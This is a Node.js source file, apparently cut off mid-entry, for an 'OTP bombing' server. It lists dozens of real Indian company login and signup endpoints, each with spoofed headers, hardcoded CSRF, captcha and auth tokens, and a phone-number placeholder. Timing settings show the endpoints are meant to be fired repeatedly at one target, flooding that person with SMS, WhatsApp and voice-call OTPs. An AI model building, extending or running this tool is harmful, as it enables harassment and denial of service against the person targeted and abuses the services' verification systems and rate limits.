// ============================================================
// api_server.js - OTP Bombing API Server (MERGED FINAL)
// ALL APIs from all files, duplicates removed
// APIs SHUFFLED (random order)
// /stats endpoint shows working/rate-limited status for all APIs
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== ALL APIS (MERGED, DEDUPLICATED & SHUFFLED) =====
// ============================================================

const APIS = [
    // ============================================================
    // 🎲 SHUFFLED ORDER - ALL APIs (Random)
    // ============================================================
    {
        name: "Zomato_2",
        method: "POST",
        url: "https://www.zomato.com/webroutes/auth/login",
        headers: {
            "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.zomato.com",
            "referer": "https://www.zomato.com/kanpur",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone" }
    },
    {
        name: "FBBOnline",
        method: "POST",
        url: "https://www.fbbonline.in/customer/account/GenerateOtp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
            "x-requested-with": "XMLHttpRequest",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "referer": "https://www.fbbonline.in/customer/account/create",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" }
    },
    {
        name: "JioSaavn", url: "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0",
        method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "TataCapital_Voice",
        method: "POST",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        headers: { "Content-Type": "application/json; charset=utf-8", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ phone: phone, applSource: "", isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Refyne_Call",
        method: "POST",
        url: "https://prod-api.refyne.co.in/auth/v2/send-otp",
        headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4)"
        },
        data: (phone) => JSON.stringify({ channel: "IVR", recipient: phone })
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01", "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Naaptol", url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.naaptol.com", "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba",
            "referer": "https://www.naaptol.com/", "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone })
    },
    {
        name: "AstroSage_WA",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        headers: { "accept": "*/*", "referer": "https://www.astrosage.com/" }
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    },
    {
        name: "RoyalChallengers", url: "https://shop.royalchallengers.com/api/customer/login",
        method: "POST",
        headers: { "Content-Type": "application/json", "user-agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" })
    },
    {
        name: "Zivame Voice",
        url: "https://zivame.com/api/v2/customer/login/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone, "otp_type": "voice"})
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*", "origin": "https://digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Tyreplex_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Myntra_Aashu",
        method: "POST",
        url: "https://www.myntra.com/api/auth/otp/send",
        headers: {
            "Host": "www.myntra.com",
            "Content-Type": "application/json",
            "Origin": "https://www.myntra.com",
            "Referer": "https://www.myntra.com/login"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Zepto", url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "TataCapital_Retail", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/" },
        data: (phone) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: phone } })
    },
    {
        name: "Oyo_1",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "text/plain;charset=UTF-8", "accept": "*/*", "origin": "https://www.oyorooms.com", "referer": "https://www.oyorooms.com/login"
        },
        data: { "phone": "{phone}", "country_code": "+91", "nod": 4 }
    },
    {
        name: "FloMattress",
        method: "POST",
        url: "https://cod.flomattress.com/api/otp",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.flomattress.com",
            "Referer": "https://www.flomattress.com/account/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "number={phone}&store=hushbedding.myshopify.com" }
    },
    {
        name: "Ullu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "accept": "application/json, text/plain, */*", "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/"
        },
        data: {}
    },
    {
        name: "Kotak_1",
        method: "POST",
        url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.kotak.com",
            "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes" }
    },
    {
        name: "Purplle",
        method: "GET",
        url: "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register",
        headers: {
            "device_id": "TEC3cjyVJhEFPGsSHw",
            "tracestate": "2174843@nr=0-1-2174843-954632846-ab28153acde8ef8e----1604563013484",
            "traceparent": "00-9c150aeaf03c0d35987fe67bd2403510-ab28153acde8ef8e-01",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIxNzQ4NDMiLCJhcCI6Ijk1NDYzMjg0NiIsImlkIjoiYWIyODE1M2FjZGU4ZWY4ZSIsInRyIjoiOWMxNTBhZWFmMDNjMGQzNTk4N2ZlNjdiZDI0MDM1MTAiLCJ0aSI6MTYwNDU2MzAxMzQ4NH19",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "application/json, text/plain, /",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs",
            "referer": "https://www.purplle.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        }
    },
    {
        name: "Gokwik", url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y" },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Zerodha_WA",
        method: "POST",
        url: "https://zerodha.com/account/registration.php",
        headers: { "accept": "*/*", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
    },
    {
        name: "Wrogn", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST",
        headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "origin": "https://wrogn.com", "referer": "https://wrogn.com/", "shop_name": "wrogn-website.myshopify.com" },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },
    {
        name: "PizzaHut",
        method: "POST",
        url: "https://api.pizzahut.io/v1/otp/generate",
        headers: {
            "x-trace-id": "f222f460-946d-4c59-bb9e-e87db924399c",
            "x-environment-flag": "production",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "recaptcha-token": "03AGdBq25_PaOvx0wAkF3F42ZlMFOK_MV_jF_Q02EKNfJN8lM1f5HSf9d4yxlWDX0Le16IU8rhHV_IUx_CkclsYMviCYTWbvdiiiaUjzTCt52xgED29gx9PW5i0enDH01ne5h3-7hE5d1XFUDaNz33HvJHsupCC1fkOXCHRmkVDOIrKrP-ucgZk8QOOtAgIfe8PJ5JkPH1eLdKVyJb5Sd3lYd8zPZUim1pt59CqOeuK_YD4PQVMt1vBoazROTGEFBfqapC40sBHBK-EbG3CjOCc3y9f7jVinXG8MZ8nhEbfUwqE4b5bGVaV3UAe3isB441XwKqYxVibHbPQwY90oq5O5o1aGB2i6aN7AUo2o5zUYA1uRIVdFZuKlZ7G2k4QusN9seS6HqHv3xESCH-C8Zk3L9QOYiO6pczr9YnkKPX8jl1lt2z4YiTRuyz1oVCFFD8qd8YFj2LMPKqgLNr8DGBPpbLtQhwArKtzQ",
            "content-type": "application/json; charset=utf-8",
            "accept": "/",
            "origin": "https://www.pizzahut.co.in",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "phone": "+91{phone}" }
    },
    {
        name: "Havells_WA", url: "https://havells.com/otplogin/account/otploginpost/", method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" }
    },
    {
        name: "Zomato_1",
        method: "POST",
        url: "https://www.zomato.com/webroutes/auth/login",
        headers: {
            "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.zomato.com",
            "referer": "https://www.zomato.com/kanpur",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone" }
    },
    {
        name: "Cashify", url: "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}",
        method: "GET", headers: { "user-agent": "okhttp/3.9.1" }
    },
    {
        name: "Netmeds",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.netmeds.com/customer/account/login"
        }
    },
    {
        name: "Pagarbook_WA",
        method: "POST",
        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
        headers: { "accept": "application/json", "appversioncode": "5268", "clientplatform": "WEB", "content-type": "application/json", "userrole": "EMPLOYER" },
        data: (phone) => JSON.stringify({ phone: phone, language: 1 })
    },
    {
        name: "Xylem_WA",
        method: "POST",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        headers: { "client-version": "300", "Authorization": "Bearer", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "Referer": "https://www.xylem.live/", "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB" },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", firstName: "Anant Ambani" })
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083", "accept": "*/*", "origin": "https://m.snapdeal.com", "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "HappyEasyGo",
        method: "GET",
        url: "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}&verifycode=FDCA",
        headers: {
            "accept": "application/json, text/plain, */*",
            "x-device": "mobile",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "referer": "https://m.happyeasygo.com/register",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        }
    },
    {
        name: "KPNFresh_WA",
        method: "POST",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        headers: { "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "BlinkrLoan", url: "https://backend.blinkrloan.com/api/user/v3/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "withCredentials": "true", "Origin": "https://www.blinkrloan.com", "Referer": "https://www.blinkrloan.com/" },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" }), rateLimit: true
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json", "Accept": "*/*", "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "BigBasket",
        method: "POST",
        url: "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        headers: {
            "accept": "application/json",
            "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "x-channel": "BB-PWA",
            "content-type": "application/json",
            "origin": "https://www.bigbasket.com",
            "referer": "https://www.bigbasket.com/auth/login/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "identifier": "{phone}" }
    },
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "Astrosage_Call",
        method: "GET",
        url: "https://varta.astrosage.com/sdk/send-otp-via-call?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&operation_name=blank&jsonpcall=1&fromresend=0&_=0",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/"
        }
    },
    {
        name: "Oyo_2",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "text/plain;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US"
        },
        data: { "phone": "{phone}", "country_code": "+91", "nod": 4 }
    },
    {
        name: "Ixigo", url: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", method: "POST",
        headers: { "content-type": "application/x-www-form-urlencoded" },
        data: { "_raw": "sixDigitOTP=true&prefix=%2B91&phone={phone}" }
    },
    {
        name: "Redcliffe_WA",
        method: "POST",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        headers: { "accept": "application/json", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91" })
    },
    {
        name: "TradeIndia", url: "https://apis.tradeindia.com/app_login_api/login_app",
        method: "POST", headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: "+91" + phone })
    },
    {
        name: "AllenSolly", url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobileoremail={phone}&name=markluther" }
    },
    {
        name: "Jockey", method: "GET",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }, rateLimit: true
    },
    {
        name: "Career360_Call", url: "https://www.careers360.com/ajax/no-cache/user/otp-send", method: "POST",
        headers: { "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile_number={phone}&method=call&uid=12692588" }
    },
    {
        name: "MamaEarth_WA", url: "https://auth.mamaearth.in/v1/auth/initiate-signup", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Swiggy_Verified",
        url: "https://profile.swiggy.com/api/v3/app/request_call_verification",
        method: "POST",
        headers: { "user-agent": "Swiggy-Android", "content-type": "application/json; charset=utf-8" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Tyreplex", url: "https://www.tyreplex.com/includes/ajax/gfend.php", method: "POST",
        headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.tyreplex.com", "Referer": "https://www.tyreplex.com/login", "X-Requested-With": "XMLHttpRequest" },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "CityMall_Web", url: "https://citymall.live/web-api/auth/send-otp", method: "POST",
        headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "SabkaLoan", url: "https://api.sabkaloan.com/api/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sabkaloan.com", "Referer": "https://sabkaloan.com/" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Grofers",
        method: "POST",
        url: "https://grofers.com/v2/accounts/",
        headers: {
            "lon": "77.040489",
            "device_id": "a11f656b-422e-4617-953b-c350d517467d",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
            "app_client": "consumer_web",
            "lat": "28.4465616",
            "content-type": "application/x-www-form-urlencoded",
            "save-data": "on",
            "accept": "*/*",
            "origin": "https://grofers.com",
            "referer": "https://grofers.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "user_phone={phone}" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
